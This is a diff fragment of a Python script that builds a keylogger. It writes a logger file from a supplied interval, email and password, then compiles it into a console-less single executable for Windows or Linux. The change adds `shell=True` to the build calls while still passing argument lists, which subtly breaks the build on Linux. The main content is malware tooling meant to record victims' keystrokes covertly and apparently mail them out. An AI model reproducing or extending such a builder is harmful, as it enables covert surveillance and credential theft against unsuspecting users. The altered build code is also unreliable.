@@ -27,10 +27,10 @@ def create_keylogger(file_name, interval, email, password):
         file.write("zlogger.start()\n")
 
 def compile_for_windows(file_name):
-    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name])
+    subprocess.call(["wine", WINDOWS_PYTHON_INTERPRETER_PATH, "--onefile", "--noconsole", file_name], shell=True)
 
 def compile_for_linux(file_name):
-    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name])
+    subprocess.call(["pyinstaller", "--onefile", "--noconsole", file_name], shell=True)
 
 arguments = get_arguments()
 create_keylogger(arguments.out, arguments.interval, arguments.email, arguments.password)
